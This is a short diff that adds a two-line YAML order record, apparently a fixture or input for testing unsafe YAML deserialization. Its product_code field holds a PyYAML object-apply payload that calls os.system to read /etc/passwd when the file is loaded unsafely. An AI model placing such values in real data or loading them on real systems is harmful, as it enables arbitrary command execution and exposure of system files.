@@ -1,0 +1,2 @@
+product_code: !!python/object/apply:os.system ['cat /etc/passwd']
+quantity: 1
